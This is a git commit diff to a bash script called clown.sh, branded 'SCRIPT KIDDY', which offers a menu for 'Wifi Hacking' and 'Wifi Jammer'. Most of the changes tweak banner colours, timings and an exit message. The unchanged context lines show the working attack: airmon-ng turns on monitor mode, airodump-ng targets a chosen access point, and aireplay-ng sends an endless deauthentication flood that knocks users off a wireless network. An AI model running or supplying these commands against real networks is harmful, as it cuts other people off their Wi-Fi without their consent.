afd90679d5284d62ec2b9f7cadb94a44381d4add
caebruh <74696377+caebruh@users.noreply.github.com>
2020-11-19 08:42:26 -0800

    Update clown.sh

--- clown.sh
+++ clown.sh
@@ -15,28 +15,27 @@ echo -e "$(tput setaf 1)
 }
 start () {
 echo -e "$(tput setaf 2)Starting script:"
-sleep 0.8
-echo "0"
-sleep 0.2
-echo "000"
-sleep 0.2
-echo "0000"
-sleep 00.2
-echo "0000"
-sleep 1.9
-echo "DONE"
+sleep 1.5
+echo "O"
+sleep 0.7
+echo "OO"
+sleep 0.9
+echo "OOO"
+sleep 0.5
+echo "OOOO"
+sleep 1.6
 echo ~$(tput setaf 7)
-sleep 3.9
+sleep 0.4 	
 clear
 }
 option () {
-echo -e "$(tput setaf 3) \n               .
-        ."
-echo -e "$(tput setaf 1)\n                           [  S C R I P T  K I D D Y ]
-echo -e "\n$(tput setaf 1)                        [  Select Option To Continue ]\n\n"
-echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 1)] $(tput setaf 4)Wifi Hacking"
+echo -e "$(tput setaf 4) \n                           [ S C R I P T  K I D D Y ]
+        
+echo -e "$(tput setaf 2)\n            "
+echo -e "\n$(tput setaf 3)                        [ Select Option To Continue ]\n\n"
+echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 1)] $(tput setaf 2)Wifi Hacking"
 echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 1)] $(tput setaf 2)Wifi Jammer"
-echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 1)] $(tput setaf 3)Exit\n\n$(tput setaf 7)"
+echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 1)] $(tput setaf 2)Exit\n\n$(tput setaf 7)"
 }
 hacking () {
 airmon-ng start wlan0 > /dev/null
@@ -76,6 +75,7 @@ hacking
 airodump-ng --bssid $bssid --channel $ch wlan0mon
 aireplay-ng -0 0 -a $bssid wlan0mon 
     ;;
+  3) echo -e "$(tput setaf 1)\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      break;
     ;;
   *) echo -e "$(tput setaf 1)Please select correct option.$(tput setaf 7)"
